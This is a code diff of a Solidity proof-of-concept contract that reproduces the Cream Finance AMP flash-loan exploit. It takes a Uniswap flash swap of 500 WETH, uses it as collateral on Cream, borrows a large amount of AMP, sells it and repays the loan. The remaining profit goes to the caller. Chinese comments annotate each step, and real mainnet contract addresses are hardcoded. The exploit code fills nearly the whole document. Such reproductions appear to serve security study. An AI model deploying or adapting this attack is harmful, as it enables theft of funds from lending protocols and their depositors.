@@ -291,7 +291,6 @@ interface Uni_Router_V2{
     // receive () external payable;
 }
 
-
 interface WETH9 {
     function name() external view returns (string memory);
 
@@ -935,14 +934,6 @@ interface AMP {
 
 contract poc {
 
-    uint256 constant amp_i_wanna_borrow_from_Cream = 2*1e16;
-    
-    uint256 constant eth_i_wanna_borrow_from_Cream = 350*1e16;
-    
-    uint256 constant weth_i_wanna_borrow_form_Uniswap = 5*1e18;
-        
-    uint256 constant weth_i_need_to_repay_to_uniswap = 502*1e16;
-    
     address constant  AMPToken_Address = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
     
     address constant  registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
@@ -964,52 +955,51 @@ contract poc {
     
     address public wallet;
     
-    uint256 public a = 0;
     ////这里必须是一个动态数组，根据uniswap的设计，该数组长度可能为2也可能为3
     address[]  path = [0xfF20817765cB7f73d4bde2e66e067E58D11095C2,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];
-
-
-    // constructor() {
-    //     IERC1820Registry(registry).setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
-        
-    //     wallet = msg.sender;
-        
-
-    // }
     
     
     function attack() public {
         
-        
+        //注册接口
         IERC1820Registry(registry).setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
         
         wallet = msg.sender;
-        
+        //触发FlashSwap
         Uni_Pair_V2(uin_WTH9_Pair_Address).swap(0, 500*1e18, address(this), "0x00");
         
     }
     
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
-        
+    
+        //把500个WETH转为500个ETH
         WETH9(WETH9_Address).withdraw(500*1e18);
         
+        //把500个ETH质押进Cream
         crETH(crETH_Address).mint{value:500*1e18}();
         
-        crETH(crETH_Address).borrow(1);
+        //这里很奇怪要先借小额的ETH,才能借出大量的AMP,暂时不清楚原因
+        crETH(crETH_Address).borrow(1*1e18);
         
+        //攻击者调用了这个函数,所以我也跟着调
         crAMP(crAMP_Address).accrueInterest();
         
+        //借大量AMP
         crAMP(crAMP_Address).borrow(19480000000000000000000000);
         
+        //把所有ETH转为WETH
         WETH9(WETH9_Address).deposit{value:address(this).balance,gas:40000}();
         
+        //Approve给RouterV2大量AMP,准备卖掉
         AMP(AMPToken_Address).approve(UniswapV2Router02_address,19480000000000000000000000000);
         
+        //卖掉AMP
         Uni_Router_V2(UniswapV2Router02_address).swapExactTokensForTokens(19480000000000000000000000,1,path,address(this),block.timestamp);
         
-        
+        //归还FlashSwap
         WETH9(WETH9_Address).transfer(uin_WTH9_Pair_Address,502*1e18);
         
+        //剩余WETH转回给测试账户
         WETH9(WETH9_Address).transfer(wallet,WETH9(WETH9_Address).balanceOf(address(this)));
         
     }
